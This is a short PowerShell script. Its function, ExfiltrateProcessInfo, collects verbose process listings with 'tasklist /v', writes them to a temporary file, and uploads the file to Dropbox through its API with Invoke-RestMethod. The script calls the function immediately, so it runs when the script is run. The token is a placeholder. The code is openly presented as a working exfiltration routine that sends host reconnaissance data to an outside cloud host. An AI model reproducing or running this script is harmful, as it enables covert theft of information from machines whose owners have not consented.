<#
This function uploads the content of a file called "tasklist_output.txt" to Dropbox using Dropbox API.

Firstly, a temporary file is created using the New-TemporaryFile cmdlet of PowerShell.

Then, the tasklist /v command is used to get the running processes output on the computer.

The output is then written to the temporary file using the Out-File cmdlet.

The Dropbox API endpoint for uploading a file is set, and the API parameters such as the destination path of the file on Dropbox and access credentials are specified.

Finally, the Invoke-RestMethod cmdlet of PowerShell is used to send an HTTP POST request to the Dropbox API and upload the file.
#>
function ExfiltrateProcessInfo {
	$localFilePath = New-TemporaryFile
	$taskListOutput = tasklist /v
	$taskListOutput | Out-File -FilePath $localFilePath
	$dropboxFilePath = "/tasklist_output.txt"

	# Required - Set here your Dropbox Token
	$accessToken = "example.com"
	$authHeader = @{Authorization = "Bearer $accessToken"}

	$fileContent = Get-Content $localFilePath

	$uploadUrl = "https://content.dropboxapi.com/2/files/upload"

	$headers = @{}
	$headers.Add("Authorization", "Bearer $accessToken")
	$headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
	$headers.Add("Content-Type", "application/octet-stream")

	Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $fileContent
}

ExfiltrateProcessInfo